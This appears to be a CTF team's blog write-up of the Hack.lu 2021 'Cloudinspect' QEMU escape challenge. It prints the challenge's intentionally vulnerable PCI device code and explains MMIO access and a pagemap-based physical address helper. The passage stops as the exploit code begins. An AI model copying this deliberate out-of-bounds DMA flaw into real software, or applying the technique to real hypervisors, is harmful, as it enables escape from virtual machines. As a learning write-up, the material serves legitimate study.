@@ -1,0 +1,658 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Hack.lu 2021 - pwn] Cloudinspect // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-8K5XT0SJN8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Hack.lu 2021 - pwn] Cloudinspect"/>
+<meta name="twitter:description" content="CloudInspect CloundInpect was a hypervisor exploitation challenge I did for the Hack.lu event. I didn&rsquo;t succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read! The related files can be found right here
+ After Whiterock released it&rsquo;s trading bot cloud with special Stonks Sockets another hedge fund, Castel, comes with some competition. The special feature here is called &ldquo;cloudinspect&rdquo;."/>
+
+    <meta property="og:title" content="[Hack.lu 2021 - pwn] Cloudinspect" />
+<meta property="og:description" content="CloudInspect CloundInpect was a hypervisor exploitation challenge I did for the Hack.lu event. I didn&rsquo;t succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read! The related files can be found right here
+ After Whiterock released it&rsquo;s trading bot cloud with special Stonks Sockets another hedge fund, Castel, comes with some competition. The special feature here is called &ldquo;cloudinspect&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/cloudinspect/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-11-07T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-11-07T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Hack.lu 2021 - pwn] Cloudinspect</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 7, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          15 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/ret2school/">ret2school</a>
+              <a class="tag" href="https://ret2school.github.io/tags/hack.lu/">hack.lu</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
+              <a class="tag" href="https://ret2school.github.io/tags/hypervisor/">hypervisor</a>
+              <a class="tag" href="https://ret2school.github.io/tags/qemu/">qemu</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2021/">2021</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="cloudinspect">CloudInspect</h1>
+<p>CloundInpect was a hypervisor exploitation challenge I did for the <a href="https://flu.xxx">Hack.lu event</a>.
+I didn&rsquo;t succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read!
+The related files can be found <a href="https://github.com/ret2school/ctf/tree/master/2021/hack.lu/pwn/cloudinspect">right here</a></p>
+<blockquote>
+<p>After Whiterock released it&rsquo;s trading bot cloud with special Stonks Sockets another hedge fund, Castel, comes with some competition. The special feature here is called &ldquo;cloudinspect&rdquo;.<br>
+The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
+</blockquote>
+<h2 id="vulnerable-pci-device">Vulnerable PCI device</h2>
+<p>We got several files:</p>
+<pre><code>$ ls
+build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
+</code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="font-weight:bold">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
+</span><span style="font-weight:bold"></span>new file mode 100644
+<span style="font-weight:bold">index 0000000000..f1c3f84b2a
+</span><span style="font-weight:bold"></span><span style="color:#8b080b">--- /dev/null
+</span><span style="color:#8b080b"></span><span style="font-weight:bold">+++ b/hw/misc/cloudinspect.c
+</span><span style="font-weight:bold"></span><span style="font-weight:bold">@@ -0,0 +1,204 @@
+</span><span style="font-weight:bold"></span><span style="font-weight:bold">+/*
+</span><span style="font-weight:bold">+ * QEMU cloudinspect intentionally vulnerable PCI device
+</span><span style="font-weight:bold">+ *
+</span><span style="font-weight:bold">+ */
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+#include &#34;qemu/osdep.h&#34;
+</span><span style="font-weight:bold">+#include &#34;qemu/units.h&#34;
+</span><span style="font-weight:bold">+#include &#34;hw/pci/pci.h&#34;
+</span><span style="font-weight:bold">+#include &#34;hw/hw.h&#34;
+</span><span style="font-weight:bold">+#include &#34;hw/pci/msi.h&#34;
+</span><span style="font-weight:bold">+#include &#34;qom/object.h&#34;
+</span><span style="font-weight:bold">+#include &#34;qemu/module.h&#34;
+</span><span style="font-weight:bold">+#include &#34;qapi/visitor.h&#34;
+</span><span style="font-weight:bold">+#include &#34;sysemu/dma.h&#34;
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+#define TYPE_PCI_CLOUDINSPECT_DEVICE &#34;cloudinspect&#34;
+</span><span style="font-weight:bold">+typedef struct CloudInspectState CloudInspectState;
+</span><span style="font-weight:bold">+DECLARE_INSTANCE_CHECKER(CloudInspectState, CLOUDINSPECT,
+</span><span style="font-weight:bold">+                         TYPE_PCI_CLOUDINSPECT_DEVICE)
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+#define DMA_SIZE        4096
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_VENDORID 0x1337
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_DEVICEID 0x1337
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_REVISION 0xc1
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_DMA_GET_VALUE      0x1
+</span><span style="font-weight:bold">+#define CLOUDINSPECT_DMA_PUT_VALUE      0x2
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+struct CloudInspectState {
+</span><span style="font-weight:bold">+    PCIDevice pdev;
+</span><span style="font-weight:bold">+    MemoryRegion mmio;
+</span><span style="font-weight:bold">+    AddressSpace *as;
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    struct dma_state {
+</span><span style="font-weight:bold">+        dma_addr_t src;
+</span><span style="font-weight:bold">+        dma_addr_t dst;
+</span><span style="font-weight:bold">+        dma_addr_t cnt;
+</span><span style="font-weight:bold">+        dma_addr_t cmd;
+</span><span style="font-weight:bold">+    } dma;
+</span><span style="font-weight:bold">+    char dma_buf[DMA_SIZE];
+</span><span style="font-weight:bold">+};
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static void cloudinspect_dma_rw(CloudInspectState *cloudinspect, bool write)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    if (write) {
+</span><span style="font-weight:bold">+        uint64_t dst = cloudinspect-&gt;dma.dst;
+</span><span style="font-weight:bold">+        // DMA_DIRECTION_TO_DEVICE: Read from an address space to PCI device
+</span><span style="font-weight:bold">+        dma_memory_read(cloudinspect-&gt;as, cloudinspect-&gt;dma.src, cloudinspect-&gt;dma_buf + dst, cloudinspect-&gt;dma.cnt);
+</span><span style="font-weight:bold">+    } else {
+</span><span style="font-weight:bold">+        uint64_t src = cloudinspect-&gt;dma.src;
+</span><span style="font-weight:bold">+        // DMA_DIRECTION_FROM_DEVICE: Write to address space from PCI device
+</span><span style="font-weight:bold">+        dma_memory_write(cloudinspect-&gt;as, cloudinspect-&gt;dma.dst, cloudinspect-&gt;dma_buf + src, cloudinspect-&gt;dma.cnt);
+</span><span style="font-weight:bold">+    }
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static bool cloudinspect_DMA_op(CloudInspectState *cloudinspect, bool write) {
+</span><span style="font-weight:bold">+    switch (cloudinspect-&gt;dma.cmd) {
+</span><span style="font-weight:bold">+        case CLOUDINSPECT_DMA_GET_VALUE:
+</span><span style="font-weight:bold">+        case CLOUDINSPECT_DMA_PUT_VALUE:
+</span><span style="font-weight:bold">+            if (cloudinspect-&gt;dma.cnt &gt; DMA_SIZE) {
+</span><span style="font-weight:bold">+                return false;
+</span><span style="font-weight:bold">+            }
+</span><span style="font-weight:bold">+            cloudinspect_dma_rw(cloudinspect, write);
+</span><span style="font-weight:bold">+            break;
+</span><span style="font-weight:bold">+        default:
+</span><span style="font-weight:bold">+            return false;
+</span><span style="font-weight:bold">+    }
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    return true;
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static uint64_t cloudinspect_mmio_read(void *opaque, hwaddr addr, unsigned size)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    CloudInspectState *cloudinspect = opaque;
+</span><span style="font-weight:bold">+    uint64_t val = ~0ULL;
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    switch (addr) {
+</span><span style="font-weight:bold">+    case 0x00:
+</span><span style="font-weight:bold">+        val = 0xc10dc10dc10dc10d;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
+</span><span style="font-weight:bold">+        val = cloudinspect-&gt;dma.cmd;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
+</span><span style="font-weight:bold">+        val = cloudinspect-&gt;dma.src;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
+</span><span style="font-weight:bold">+        val = cloudinspect-&gt;dma.dst;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
+</span><span style="font-weight:bold">+        val = cloudinspect-&gt;dma.cnt;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
+</span><span style="font-weight:bold">+        val = cloudinspect_DMA_op(cloudinspect, false);
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    }
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    return val;
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static void cloudinspect_mmio_write(void *opaque, hwaddr addr, uint64_t val,
+</span><span style="font-weight:bold">+                unsigned size)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    CloudInspectState *cloudinspect = opaque;
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    switch (addr) {
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
+</span><span style="font-weight:bold">+        cloudinspect-&gt;dma.cmd = val;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
+</span><span style="font-weight:bold">+        cloudinspect-&gt;dma.src = val;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
+</span><span style="font-weight:bold">+        cloudinspect-&gt;dma.dst = val;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
+</span><span style="font-weight:bold">+        cloudinspect-&gt;dma.cnt = val;
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
+</span><span style="font-weight:bold">+        val = cloudinspect_DMA_op(cloudinspect, true);
+</span><span style="font-weight:bold">+        break;
+</span><span style="font-weight:bold">+    }
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static const MemoryRegionOps cloudinspect_mmio_ops = {
+</span><span style="font-weight:bold">+    .read = cloudinspect_mmio_read,
+</span><span style="font-weight:bold">+    .write = cloudinspect_mmio_write,
+</span><span style="font-weight:bold">+    .endianness = DEVICE_NATIVE_ENDIAN,
+</span><span style="font-weight:bold">+    .valid = {
+</span><span style="font-weight:bold">+        .min_access_size = 4,
+</span><span style="font-weight:bold">+        .max_access_size = 8,
+</span><span style="font-weight:bold">+    },
+</span><span style="font-weight:bold">+    .impl = {
+</span><span style="font-weight:bold">+        .min_access_size = 4,
+</span><span style="font-weight:bold">+        .max_access_size = 8,
+</span><span style="font-weight:bold">+    },
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+};
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static void pci_cloudinspect_realize(PCIDevice *pdev, Error **errp)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
+</span><span style="font-weight:bold">+    // uint8_t *pci_conf = pdev-&gt;config;
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    if (msi_init(pdev, 0, 1, true, false, errp)) {
+</span><span style="font-weight:bold">+        return;
+</span><span style="font-weight:bold">+    }
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    cloudinspect-&gt;as = &amp;address_space_memory;
+</span><span style="font-weight:bold">+    memory_region_init_io(&amp;cloudinspect-&gt;mmio, OBJECT(cloudinspect), &amp;cloudinspect_mmio_ops, cloudinspect,
+</span><span style="font-weight:bold">+                    &#34;cloudinspect-mmio&#34;, 1 * MiB);
+</span><span style="font-weight:bold">+    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;cloudinspect-&gt;mmio);
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static void pci_cloudinspect_uninit(PCIDevice *pdev)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    msi_uninit(pdev);
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static void cloudinspect_instance_init(Object *obj)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(obj);
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static void cloudinspect_class_init(ObjectClass *class, void *data)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    DeviceClass *dc = DEVICE_CLASS(class);
+</span><span style="font-weight:bold">+    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    k-&gt;realize = pci_cloudinspect_realize;
+</span><span style="font-weight:bold">+    k-&gt;exit = pci_cloudinspect_uninit;
+</span><span style="font-weight:bold">+    k-&gt;vendor_id = CLOUDINSPECT_VENDORID;
+</span><span style="font-weight:bold">+    k-&gt;device_id = CLOUDINSPECT_DEVICEID;
+</span><span style="font-weight:bold">+    k-&gt;revision = CLOUDINSPECT_REVISION;
+</span><span style="font-weight:bold">+    k-&gt;class_id = PCI_CLASS_OTHERS;
+</span><span style="font-weight:bold">+    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+static void pci_cloudinspect_register_types(void)
+</span><span style="font-weight:bold">+{
+</span><span style="font-weight:bold">+    static InterfaceInfo interfaces[] = {
+</span><span style="font-weight:bold">+        { INTERFACE_CONVENTIONAL_PCI_DEVICE },
+</span><span style="font-weight:bold">+        { },
+</span><span style="font-weight:bold">+    };
+</span><span style="font-weight:bold">+    static const TypeInfo cloudinspect_info = {
+</span><span style="font-weight:bold">+        .name          = TYPE_PCI_CLOUDINSPECT_DEVICE,
+</span><span style="font-weight:bold">+        .parent        = TYPE_PCI_DEVICE,
+</span><span style="font-weight:bold">+        .instance_size = sizeof(CloudInspectState),
+</span><span style="font-weight:bold">+        .instance_init = cloudinspect_instance_init,
+</span><span style="font-weight:bold">+        .class_init    = cloudinspect_class_init,
+</span><span style="font-weight:bold">+        .interfaces = interfaces,
+</span><span style="font-weight:bold">+    };
+</span><span style="font-weight:bold">+
+</span><span style="font-weight:bold">+    type_register_static(&amp;cloudinspect_info);
+</span><span style="font-weight:bold">+}
+</span><span style="font-weight:bold">+type_init(pci_cloudinspect_register_types)
+</span><span style="font-weight:bold"></span><span style="font-weight:bold">diff --git a/hw/misc/meson.build b/hw/misc/meson.build
+</span><span style="font-weight:bold">index 1cd48e8a0f..5ff263ca2f 100644
+</span><span style="font-weight:bold"></span><span style="color:#8b080b">--- a/hw/misc/meson.build
+</span><span style="color:#8b080b"></span><span style="font-weight:bold">+++ b/hw/misc/meson.build
+</span><span style="font-weight:bold"></span><span style="font-weight:bold">@@ -1,5 +1,6 @@
+</span><span style="font-weight:bold"></span> softmmu_ss.add(when: &#39;CONFIG_APPLESMC&#39;, if_true: files(&#39;applesmc.c&#39;))
+ softmmu_ss.add(when: &#39;CONFIG_EDU&#39;, if_true: files(&#39;edu.c&#39;))
+<span style="font-weight:bold">+softmmu_ss.add(files(&#39;cloudinspect.c&#39;))
+</span><span style="font-weight:bold"></span> softmmu_ss.add(when: &#39;CONFIG_FW_CFG_DMA&#39;, if_true: files(&#39;vmcoreinfo.c&#39;))
+ softmmu_ss.add(when: &#39;CONFIG_ISA_DEBUG&#39;, if_true: files(&#39;debugexit.c&#39;))
+ softmmu_ss.add(when: &#39;CONFIG_ISA_TESTDEV&#39;, if_true: files(&#39;pc-testdev.c&#39;))
+</code></pre></div><p>The first thing I did when I saw this was to check out how <code>memory_region_init_io</code> and <code>pci_register_bar</code> functions work. It sounds a bit like like a kernel device which registers a few handlers for basic operations like read / write / ioctl. Very quickly I found two write up from dangokyo <a href="https://dangokyo.me/2018/03/28/qemu-internal-pci-device/">this one</a>  and <a href="https://dangokyo.me/2018/03/25/hitb-xctf-2017-babyqemu-write-up/">this other one</a>, I recommend you to check it out, they are pretty interesting and well written.</p>
+<p>PCI stands for Peripheral Component Interconnect, that&rsquo;s a standard that describes the interactions between the cpu and the other physical devices. The PCI device handles the interactions between the system and the physical device. To do so,  the PCI handler is providing a physical address space to the kernel, reachable through the kernel abstractions from a particular virtual address space. This address can be used to cache some data, but that&rsquo;s mainly used to request a particular behavior from the kernel to the physical devices. These requests are written at a well defined offset in the PCI address space, that are the I/O registers. And in the same way, the devices are waiting for some values at these locations to trigger a particular behavior. Check out <a href="https://tldp.org/LDP/tlk/dd/pci.html">this</a> and <a href="https://www.kernel.org/doc/html/latest/PCI/pci.html#mmio-space-and-write-posting">this</a> to learn more about PCI devices!</p>
+<p>Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. <em>nothing</em>. That&rsquo;s just a vulnerable PCI device which allows us to read and write four I/O registers (<code>CNT</code>, <code>SRC</code>, <code>CMD</code> and <code>DST</code>). According to these registers, we can read and write at an arbitrary location. There is a check about the size we&rsquo;re requesting for read / write operations at a particular offset from the <code>dmabuf</code> base address, but since we control the offset it does not matter.</p>
+<p>To write these registers from userland, we need to <code>mmap</code> the right <code>resource</code> file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.</p>
+<p>The resource file can be found by getting a shell on the machine to take a look at the output of the <code>lspci</code> command.</p>
+<pre><code>/ # lspci -v
+00:01.0 Class 0601: 8086:7000
+00:00.0 Class 0600: 8086:1237
+00:01.3 Class 0680: 8086:7113
+00:01.1 Class 0101: 8086:7010
+00:02.0 Class 00ff: 1337:1337
+</code></pre><p>The output of the command is structured like this:</p>
+<pre><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
+Field 2 : 00ff    : device class
+Field 3 : 1337    : vendor ID
+Field 4 : 1337    : device ID
+</code></pre><p>According to the source code of the PCI device, the vendor ID and the device ID are <code>0x1337</code>, the resource file corresponding to the device is so <code>/sys/devices/pci0000:00/0000:00:02.0/resource0</code>.</p>
+<h2 id="device-interactions">Device interactions</h2>
+<p>What we need to interact with the device is to get the physical address of a memory area we control, which would act like a shared buffer between our program and the PCI device. To do so we can <code>mmap</code> a few pages, <code>malloc</code> a buffer or just allocate onto the function&rsquo;s stackframe a large buffer. Given that I was following the thedangokyo&rsquo;s write up, I just retrieved a few functions he was using and especially for the shared buffer.</p>
+<p>The function used to get the physical address corresponding to an arbitrary pointer is based on the <code>/proc/self/pagemap</code> pseudo-file, for which you can read the format <a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt">here</a>. The virt2phys function looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">uint64_t <span style="color:#50fa7b">virt2phys</span>(<span style="color:#8be9fd">void</span><span style="color:#ff79c6">*</span> p)
+{
+		uint64_t virt <span style="color:#ff79c6">=</span> (uint64_t)p;
+		assert((virt <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xfff</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>);
+		<span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/proc/self/pagemap&#34;</span>, O_RDONLY);
+		<span style="color:#ff79c6">if</span> (fd <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)
+				perror(<span style="color:#f1fa8c">&#34;open&#34;</span>);
+		uint64_t offset <span style="color:#ff79c6">=</span> (virt <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">0x1000</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>;
+		<span style="color:#6272a4">// the pagemap associates each mapped page of the virtual address space 
+</span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// with its PTE entry, the entry corresponding to the page is at address / PAGE_SZ
+</span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// and because that&#39;s an array of 64 bits entry, to access the right entry, the
+</span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// offset is multiplied per 8. 
+</span><span style="color:#6272a4"></span>		lseek(fd, offset, SEEK_SET);
+		uint64_t phys;
+		<span style="color:#ff79c6">if</span> (read(fd, <span style="color:#ff79c6">&amp;</span>phys, <span style="color:#bd93f9">8</span> ) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">8</span>)
+				perror(<span style="color:#f1fa8c">&#34;read&#34;</span>);
+		assert(phys <span style="color:#ff79c6">&amp;</span> (<span style="color:#bd93f9">1ULL</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">63</span>));
+		<span style="color:#6272a4">// asserts the bit IS_PRESENT is set
+</span><span style="color:#6272a4"></span>		phys <span style="color:#ff79c6">=</span> (phys <span style="color:#ff79c6">&amp;</span> ((<span style="color:#bd93f9">1ULL</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">54</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>)) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x1000</span>;
+		<span style="color:#6272a4">// flips out the status bits, and shifts the physical frame address to 64 bits
+</span><span style="color:#6272a4"></span>		<span style="color:#ff79c6">return</span> phys;
+}
+</code></pre></div><p>To interact with the device we can write the code right bellow:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;assert.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;inttypes.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/mman.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdbool.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> iomem;
+<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> dmabuf;
